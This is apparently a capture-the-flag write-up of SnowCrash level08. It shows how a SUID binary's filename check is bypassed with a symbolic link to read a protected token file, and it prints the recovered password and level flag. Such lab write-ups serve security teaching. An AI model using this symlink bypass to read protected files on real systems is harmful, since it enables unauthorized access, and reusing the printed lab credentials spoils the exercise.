# Level08: Bypassing Filename Checks

## Vulnerability Analysis

Upon logging in as level08, we found the following files in the home directory:

```console
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

This showed:

- An executable binary `level08` with SUID bit set (owned by flag08)
- A file called `token` with strict permissions (only readable by flag08)

## Binary Analysis

Using Ghidra to decompile the `level08` binary, the following C code snippet reveals that the program attempts to prevent access to files containing "token" in their name using `strstr`.

```c
  // Check if the filename contains "token"
  pcVar1 = strstr(argv[1], "token");
  if (pcVar1 != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(1);
    }
  // Open the file (vulnerable step)
  fd = open(argv[1], O_RDONLY);
  // ... read and print file content ...
```

The binary has the SUID bit set, meaning it runs with the privileges of its owner (flag08), which allows it to read files that the current user (level08) cannot access directly.

## The Vulnerability

The vulnerability lies in the naive string check: the program only checks if the string "token" appears in the filename argument, not whether the file being accessed is actually the token file.

This is a classic security issue where path validation is performed on the filename string rather than on the actual file identity (inode).

## Exploitation

We can bypass this check by creating a symbolic link to the token file with a name that doesn't contain the string "token":

```console
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/nekot
level08@SnowCrash:~$ ./level08 /tmp/nekot
quif5eloekouj29ke0vouxean
```

- `ln`: Creates links between files.

- `-s`: Creates a symbolic link (symlink) instead of a hard link. A symbolic link is like a shortcut that points to another file.

## Why This Works

1. The symbolic link `/tmp/nekot` points to the actual token file
2. When `level08` checks the filename, it sees "nekot" which doesn't contain "token"
3. The check passes, and the program proceeds to open the file
4. Because of the SUID bit, the program opens the file with flag08's privileges
5. After opening the file, the program reads and displays its contents

This is a classic example of the difference between validating the name of a resource versus validating the resource itself, a common security pitfall.

## Token

After reading the token file, we obtained: `quif5eloekouj29ke0vouxean`

This is the password for the flag08 user, not the actual token for the level. To get the token:

```console
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

The actual token for level08 is: `25749xKZ8L7DkSCwJkT9dyv6f`

This token allows access to the level09 user account.

## Security Lesson

This level demonstrates several important security concepts:

1. Path traversal vulnerabilities
2. The importance of proper file validation
3. How symbolic links can be used to bypass naive security checks
4. The risks associated with SUID binaries combined with inadequate input validation
